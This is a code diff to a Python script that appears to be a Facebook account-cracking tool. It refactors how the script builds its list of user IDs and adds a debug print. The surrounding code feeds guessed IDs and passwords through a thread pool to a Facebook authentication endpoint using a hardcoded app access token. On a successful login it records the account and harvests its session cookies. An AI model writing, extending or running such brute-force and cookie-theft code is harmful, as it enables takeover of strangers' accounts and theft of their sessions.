@@ -84,10 +84,10 @@ class sort:
 
 oks = []
 loop = 0
-user = []
+
 
 def old():
-    global user
+    user = []
     sort.clear()
     sort.logo()
     print("[b]    [red1][A] [sea_green2]Crack 10001-10009 Id")
@@ -127,6 +127,9 @@ def old():
         except Exception as e:
             print("Error:", e)
             old()
+        for mal in fl:
+            uid = mal.split("|")[0]
+            user.append(uid)
 
     print("[b]    [red1][1] [sea_green2]Method A")
     print("[b]    [red1][2] [spring_green1]Method B")
@@ -151,9 +154,8 @@ def old():
                 uid = star + mal
                 heron.submit(login, uid, meth)
         else:
-            for mal in fl:
-                uid = mal.split("|")[0]
-                user.append(uid)
+            for mal in user:
+                uid = mal
                 heron.submit(login, uid, meth)
 
 
@@ -186,6 +188,7 @@ def login(uid, meth):
                           ".headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728"
                           "|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",
                 headers=headers).json()
+            print(uid)
             if "session_key" in rp:
                 oks.append(uid)
                 coki = ";".join(i["name"] + "=" + i["value"] for i in rp["session_cookies"])
